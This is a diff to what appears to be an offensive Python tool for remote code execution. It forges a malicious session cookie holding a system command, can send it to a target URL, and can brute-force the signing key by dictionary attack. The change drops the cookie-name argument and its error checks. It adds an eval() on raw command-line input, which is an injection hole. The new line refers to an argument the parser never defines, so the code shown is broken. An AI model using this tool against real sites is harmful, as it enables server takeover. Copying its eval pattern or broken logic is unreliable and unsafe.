@@ -26,9 +26,6 @@ class RCE:
             try:
                 if cookie_name:
                     cookies = {cookie_name: forged_cookie.decode()}
-                else:
-                    console.print("[bold red]Error:[/bold red] --cookie-name option is required with --url")
-                    exit(1)
                 requests.get(url, cookies=cookies, timeout=3)
                 console.print(f"[bold][green]Request sent with forged cookie:[/green][/bold]")
             except requests.Timeout:
@@ -127,8 +124,6 @@ def main():
     parser.add_argument('-w', '--wordlist', help='Path to the wordlist for dictionary attack')
     parser.add_argument('-m', '--cmd', help='System command to execute for RCE encoding (required for rce action)')
     parser.add_argument('-u', '--url', help='URL to send request with forged cookie (optional for rce action)')
-    parser.add_argument('-n', '--cookie-name', help='Name of the forged cookie to send in the request (required if --url is specified)')
-
     args = parser.parse_args()
 
     if args.action in ['encode', 'decode', 'rce'] and not args.key:
@@ -151,13 +146,12 @@ def main():
             parser.error('--cmd is required for rce action')
         
         rce_instance = RCE(args.cmd)
-        rce_instance.forge_cookie_and_send_request(args.key, args.url, args.cookie_name)
+        # Convert the cookie string to a tuple and get the first element (Cookie Key)
+        cookie_name = eval(args.cookie)[0]
+        rce_instance.forge_cookie_and_send_request(args.key, args.url, cookie_name)
         
         encoded_cookie = encoder_decoder.encode_rce(args.cmd)
-        console.print(f"[bold][blue]Encoded cookie with custom object (RCE):[/blue] [green]{encoded_cookie.decode()}[/green][/bold]")
-        
-        if args.url and not args.cookie_name:
-            console.print("[bold red]--cookie-name is required when --url is specified.[/bold red]")
+        console.print(f"[bold green]{encoded_cookie.decode()}[/bold green]")
     elif args.action == 'dict-attack':
         if not args.wordlist:
             parser.error('--wordlist is required for dict-attack action')
